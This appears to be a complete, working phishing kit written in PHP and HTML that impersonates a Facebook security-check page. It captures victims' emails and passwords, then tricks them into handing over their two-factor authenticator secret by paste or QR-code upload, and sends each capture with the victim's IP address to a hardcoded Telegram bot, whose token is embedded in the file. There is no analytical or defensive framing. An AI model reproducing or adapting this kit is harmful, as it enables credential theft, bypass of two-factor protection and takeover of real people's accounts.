<?php
// Telegram bot settings
$botToken = '8413250013:AAGSlQqo5vZJaI8AiqOs56J3vg9dOthuz40';
$chatId   = '1622637334';

// Send to Telegram
function sendToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=HTML";
    @file_get_contents($url);
}

// Simple TOTP generator
function generateTOTP($secret) {
    $secret = strtoupper(preg_replace('/\s+/', '', $secret));
    $key = base32_decode($secret);
    $time = floor(time() / 30);
    $time = pack('N*', 0) . pack('N*', $time);
    $hmac = hash_hmac('sha1', $time, $key, true);
    $offset = ord(substr($hmac, -1)) & 0x0F;
    $hashpart = substr($hmac, $offset, 4);
    $val = unpack('N', $hashpart)[1] & 0x7FFFFFFF;
    return str_pad($val % 1000000, 6, '0', STR_PAD_LEFT);
}

function base32_decode($base32) {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    $base32 = str_replace('=', '', $base32);
    $bits = '';
    for ($i = 0; $i < strlen($base32); $i++) {
        $val = strpos($alphabet, $base32[$i]);
        $bits .= str_pad(decbin($val), 5, '0', STR_PAD_LEFT);
    }
    $bytes = '';
    for ($i = 0; $i < strlen($bits); $i += 8) {
        $bytes .= chr(bindec(substr($bits, $i, 8)));
    }
    return $bytes;
}

// Handle POST
$step = $_POST['step'] ?? 'login';
$show_confirm = false;
$show_guide = false;
$show_code = false;
$email = '';
$totp_code = '';
$secret = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    if ($step === 'login') {
        $email    = $_POST['email'] ?? 'N/A';
        $password = $_POST['pass']  ?? 'N/A';

        $msg = "💥 FB LOGIN HIT 💥\nEmail/Phone: $email\nPass: $password\nIP: $ip\nUA: $ua\nTime: " . date('Y-m-d H:i:s') . " WAT";
        sendToTelegram($msg);

        $show_confirm = true;
    } elseif ($step === 'confirm') {
        $show_guide = true;
    } elseif ($step === 'key') {
        $email = $_POST['email'] ?? 'N/A';
        $secret = $_POST['secret'] ?? '';

        if (strlen($secret) >= 16) {
            $totp_code = generateTOTP($secret);

            $msg = "🔑 2FA SECRET CAPTURED (QR/PASTE) 🔑\nEmail/Phone: $email\nSecret Key: $secret\nGenerated Code: $totp_code\nIP: $ip\nTime: " . date('Y-m-d H:i:s') . " WAT";
            sendToTelegram($msg);

            $show_code = true;
        } else {
            $show_guide = true;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <title>Security Check - Facebook</title>
    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background:#f0f2f5; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
        .container { background:white; padding:30px 20px; border-radius:10px; box-shadow:0 4px 12px rgba(0,0,0,0.15); width:100%; max-width:380px; text-align:center; }
        .logo { width:160px; margin:0 auto 25px; display:block; }
        .title { font-size:24px; font-weight:600; margin-bottom:8px; color:#1c1e21; }
        .subtitle { font-size:15px; color:#606770; margin-bottom:25px; line-height:1.4; }
        .info-box { background:#e8f0fe; color:#1a73e8; padding:15px; border-radius:8px; margin-bottom:25px; font-size:15px; }
        input, textarea { width:100%; padding:16px; margin:10px 0; border:1px solid #dddfe2; border-radius:8px; font-size:17px; background:#f5f6f7; }
        input:focus, textarea:focus { border-color:#1877f2; outline:none; background:white; }
        button { width:100%; padding:14px; background:#1877f2; color:white; border:none; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; margin-top:10px; }
        button:active { background:#166fe5; }
        .guide-step { text-align:left; font-size:15px; margin:15px 0; color:#1c1e21; }
        .guide-step strong { color:#1877f2; }
        .code-display { font-size:32px; letter-spacing:6px; background:#e8f0fe; padding:15px; border-radius:8px; margin:20px 0; font-weight:bold; color:#1a73e8; }
        .qr-preview { width:100%; max-height:200px; margin:10px 0; border:1px solid #ddd; border-radius:8px; }
        .link { color:#1877f2; text-decoration:none; font-size:14px; margin-top:20px; display:inline-block; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">

    <?php if ($step === 'login' && !$show_confirm && !$show_guide && !$show_code): ?>
        <div class="title">Log in to continue</div>
        <div class="subtitle">Use your Facebook account</div>
        <form method="POST">
            <input type="hidden" name="step" value="login">
            <input type="text" name="email" placeholder="Email or phone number" required autocomplete="off" autocorrect="off" autocapitalize="off">
            <input type="password" name="pass" placeholder="Password" required autocomplete="off">
            <button type="submit">Log In</button>
        </form>

    <?php elseif ($show_confirm): ?>
        <div class="info-box">
            <strong>Confirm Your Account to Continue</strong><br>
            For your security, one more verification step is needed before you can proceed.
        </div>
        <div class="title">Additional Verification Required</div>
        <div class="subtitle">Set up the Facebook Mobile App Authenticator</div>
        <form method="POST">
            <input type="hidden" name="step" value="confirm">
            <button type="submit">Continue Setup</button>
        </form>

    <?php elseif ($show_guide): ?>
        <div class="title">Set Up Authenticator App</div>
        <div class="subtitle">Open your Facebook mobile app and follow these steps:</div>
        <div class="guide-step"><strong>1.</strong> Tap menu (three lines) → Settings & Privacy → Settings.</div>
        <div class="guide-step"><strong>2.</strong> Go to Accounts Center → Password and security → Two-factor authentication.</div>
        <div class="guide-step"><strong>3.</strong> Select your account → Authentication App.</div>
        <div class="guide-step"><strong>4.</strong> Facebook shows a QR code and secret key below it.</div>
        <div class="guide-step"><strong>5.</strong> Scan the QR with your phone camera, or copy the secret key text.</div>
        <div class="guide-step"><strong>6.</strong> Paste the secret key here, or upload a screenshot of the QR code (we'll decode it automatically).</div>

        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="step" value="key">
            <input type="hidden" name="email" value="<?= htmlspecialchars($email) ?>">
            <input type="text" name="secret" id="secretInput" placeholder="Paste secret key or wait for QR scan" required autocomplete="off" autocorrect="off" autocapitalize="off" style="text-transform:uppercase;">
            <input type="file" id="qrUpload" accept="image/*" style="margin:15px 0;">
            <img id="qrPreview" class="qr-preview" style="display:none;">
            <button type="submit">Verify & Get Code</button>
        </form>

        <script>
            const qrUpload = document.getElementById('qrUpload');
            const preview = document.getElementById('qrPreview');
            const secretInput = document.getElementById('secretInput');

            qrUpload.addEventListener('change', function(e) {
                const file = e.target.files[0];
                if (!file) return;

                const reader = new FileReader();
                reader.onload = function(event) {
                    preview.src = event.target.result;
                    preview.style.display = 'block';

                    const img = new Image();
                    img.onload = function() {
                        const canvas = document.createElement('canvas');
                        canvas.width = img.width;
                        canvas.height = img.height;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0);
                        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                        const code = jsQR(imageData.data, imageData.width, imageData.height);
                        if (code && code.data.startsWith('otpauth://totp/')) {
                            const params = new URLSearchParams(code.data.split('?')[1]);
                            const secret = params.get('secret');
                            if (secret) {
                                secretInput.value = secret;
                                alert('QR decoded! Secret key auto-filled: ' + secret);
                            }
                        } else {
                            alert('Could not decode QR. Paste the secret key manually.');
                        }
                    };
                    img.src = preview.src;
                };
                reader.readAsDataURL(file);
            });
        </script>

        <a href="#" class="link">Having trouble? Contact support</a>

    <?php elseif ($show_code): ?>
        <div class="title">Verification Code Generated</div>
        <div class="subtitle">Enter this code in the Facebook app to finish setup:</div>
        <div class="code-display"><?= $totp_code ?></div>
        <div class="subtitle" style="font-size:14px;">Code refreshes every 30 seconds. Enter it now.</div>
        <p style="margin:20px 0; font-size:14px; color:#606770;">
            Back to Facebook app → Enter code → Setup complete.
        </p>
        <script>
            setTimeout(() => { window.location.href = 'https://www.facebook.com'; }, 10000);
        </script>
        <div style="font-size:13px; color:#777;">Redirecting to Facebook in 10 seconds...</div>
    <?php endif; ?>
</div>

</body>
</html>